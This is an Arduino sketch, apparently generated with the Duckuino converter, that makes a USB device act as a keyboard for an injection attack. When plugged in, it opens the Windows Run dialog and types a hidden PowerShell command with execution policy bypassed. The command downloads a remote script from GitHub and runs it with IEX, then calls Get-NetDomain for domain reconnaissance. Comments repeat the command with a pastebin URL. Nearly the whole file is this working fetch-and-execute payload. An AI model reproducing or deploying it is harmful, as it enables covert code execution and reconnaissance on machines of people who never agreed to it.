/**
   Made with Duckuino, an open-source project.
   Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
   : = 63
   ; = 47
   ' = 96
   " = 126
*/

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
//powershell.exe -WindowStyle hidden -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/XWnCgk9Y'); Get-NetDomain"
/* Init function */
int a = 126;
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell.exe -WindowStyle hidden -exec bypass -Command "));
  Keyboard.write(126);
  Keyboard.print(F("IEX (New-Object Net.WebClient).DownloadString("));
  Keyboard.write(96);
  Keyboard.print(F("https"));
  Keyboard.write(63);
  Keyboard.print(F("\334\334raw.githubusercontent.com\334ZoeiroVader\334ZvProjects\334master\334AppGerenciador\334log.txt"));
  Keyboard.write(96);
  Keyboard.print(F(")"));
  Keyboard.write(47);
  Keyboard.print(F(" Get-NetDomain"));
  Keyboard.write(126);
  delay(300);
  typeKey(KEY_RETURN);
  //https://raw.githubusercontent.com/ZoeiroVader/ZvProjects/master/AppGerenciador/log.txt
  //powershell.exe -WindowStyle hidden -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ZoeiroVader/Xmaster/appGerenciador/log.txt'); Get-NetDomain"
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}